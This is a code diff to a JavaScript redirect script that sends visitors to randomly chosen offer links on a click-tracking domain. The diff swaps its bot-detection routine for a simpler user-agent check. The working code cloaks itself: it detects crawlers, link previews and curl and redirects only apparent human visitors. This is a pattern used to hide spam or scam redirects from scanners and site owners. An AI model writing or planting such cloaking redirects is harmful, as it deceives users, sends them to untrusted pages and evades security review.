@@ -11,31 +11,13 @@
       "https://snurik.top/click?o=2&a=6549&sub_id1=domen1"
     ];
 
-    function isBot() {
-      const nav = navigator || {};
-      const userAgent = nav.userAgent || "";
-      const webdriver = nav.webdriver || false;
-      const languages = nav.languages || [];
-      const plugins = nav.plugins || [];
-
-      const botPatterns = [
-        /bot/i,
-        /crawler/i,
-        /spider/i,
-        /preview/i,
-        /fetch/i,
-        /curl/i
-      ];
-
-      return (
-        webdriver ||
-        plugins.length === 0 ||
-        languages.length === 0 ||
-        botPatterns.some(p => p.test(userAgent))
-      );
+    function isRealUser() {
+      const ua = navigator.userAgent || "";
+      const botKeywords = /bot|crawler|spider|curl|fetch|preview/i;
+      return !botKeywords.test(ua);
     }
 
-    if (!isBot()) {
+    if (isRealUser()) {
       const index = Math.floor(Math.random() * offers.length);
       window.location.href = offers[index];
     } else {
